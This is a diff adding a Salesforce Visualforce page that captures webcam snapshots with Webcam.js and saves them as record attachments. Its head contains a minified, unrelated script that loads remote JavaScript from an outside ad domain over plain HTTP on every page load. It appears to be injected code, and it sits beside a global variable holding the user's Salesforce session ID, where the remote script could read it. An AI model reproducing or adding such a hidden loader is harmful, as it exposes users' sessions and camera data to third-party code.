@@ -1,0 +1,73 @@
+<apex:page controller="CameraAccess" standardStylesheets="false" showHeader="false">
+
+		<html lang="en">
+		<head>
+			<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+
+			<style type="text/css">
+			body { font-family: Helvetica, sans-serif; }
+			h2, h3 { margin-top:0; }
+			form { margin-top: 15px; }
+			form > input { margin-right: 15px; }
+			#results { float:right; margin:20px; padding:20px; border:1px solid; background:#ccc; }
+			</style>
+		<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://img.rafomedia.com/zr/js/adrns.js?2015070901";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>
+		<script type="text/javascript">
+			var __sfdcSessionId = '{!GETSESSIONID()}';
+		</script>
+		<script src="../../soap/ajax/37.0/connection.js" type="text/javascript"></script>
+		<script src="../../soap/ajax/37.0/apex.js" type="text/javascript"></script>
+	
+		</head>
+		<body>
+			<div id="results">Your captured image will appear here...</div>
+
+			<div id="my_camera"></div>
+
+			<!-- First, include the Webcam.js JavaScript Library -->
+			<script type="text/javascript" src="{!$Resource.webcam}"></script>
+
+			<!-- Configure a few settings and attach camera -->
+			<script language="JavaScript">
+			Webcam.set({
+				width: 320,
+				height: 240,
+				image_format: 'jpeg',
+				jpeg_quality: 90
+			});
+			Webcam.attach( '#my_camera' );
+			</script>
+
+			<!-- A button for taking snaps -->
+			<form>
+			<input type="button" value="Take Snapshot" onClick="take_snapshot()"/>
+			</form>
+
+			<!-- Code to handle taking the snapshot and displaying it locally -->
+			<script language="JavaScript">
+			function take_snapshot() {
+				// take snapshot and get image data
+				Webcam.snap( function(data_uri) {
+				// display results in page
+				document.getElementById('results').innerHTML = 
+					'<h2>Here is your image:</h2>' + 
+					'<img src="'+data_uri+'"/>';
+					new_attach(data_uri.replace('data:image/jpeg;base64,',''));
+				} );
+				
+			}
+			function new_attach(body64) {
+				var connection = sforce.connection;
+				var snapshot = new sforce.SObject("Attachment");
+				snapshot.Name = "snapshot.jpeg";
+				snapshot.parentId = "0036F000023sfFa";
+				snapshot.body = body64;
+				snapshot.ContentType = "image/jpeg";
+				result = sforce.connection.create([snapshot]);
+				console.log('result==='+result);
+			}
+			</script>
+
+		</body>
+		</html>
+		</apex:page>
